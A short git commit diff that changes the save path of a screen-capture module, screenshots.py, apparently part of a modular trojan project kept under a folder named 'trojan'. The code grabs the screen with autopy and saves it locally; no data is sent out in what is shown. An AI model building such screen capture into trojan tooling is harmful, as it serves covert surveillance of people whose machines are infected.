e61c643852e79d265dbd1d7d5994d6be018de151
root <root@localhost.localdomain>
2019-01-16 00:20:49 +0200

    Adding new modules.

--- modules/screenshots.py
+++ modules/screenshots.py
@@ -5,6 +5,6 @@ def run(**args):
   print("taking screenshot...")
   time.sleep(2)
   b = autopy.bitmap.capture_screen()
-  b.save("/root/Desktop/trojan/screenshot.png")
+  b.save("/root/Desktop/trojan/data/screenshot.png")
 
   return b
